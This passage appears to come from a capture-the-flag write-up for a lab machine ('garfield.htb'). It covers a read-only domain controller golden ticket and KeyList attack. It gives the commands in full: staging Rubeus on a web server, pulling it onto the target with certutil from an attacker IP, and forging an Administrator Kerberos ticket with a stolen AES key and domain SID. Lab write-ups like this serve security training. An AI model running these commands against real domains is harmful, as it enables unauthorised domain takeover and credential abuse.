## Phase 12 — RODC Golden Ticket + KeyList Attack

> ⚠️ **Rubeus v2.2.0 fails for this attack.** The v2.2.0 KeyList TGS-REQ was missing proper `PA-FOR-USER` pre-authentication data that DC01 requires. v2.3.3 fixed this. Tool version matters.

```bash
# Download and serve newer Rubeus (v2.3.3+)
wget https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/Rubeus.exe -O /tmp/Rubeus.exe
python3 -m http.server 8000
```

On RODC01 via psexec:

```cmd
# Download newer Rubeus
certutil -urlcache -split -f http://10.10.16.81:8000/Rubeus.exe Rubeus.exe

# Forge the RODC golden ticket
C:\Users\Public\Desktop> .\Rubeus.exe golden /rodcNumber:8245 `
  /flags:forwardable,renewable,enc_pa_rep `
  /aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 `
  /user:Administrator /id:500 `
  /domain:garfield.htb `
  /sid:S-1-5-21-2502726253-3859040611-225969357 `
  /nowrap /outfile:ticket_final.kirbi
```

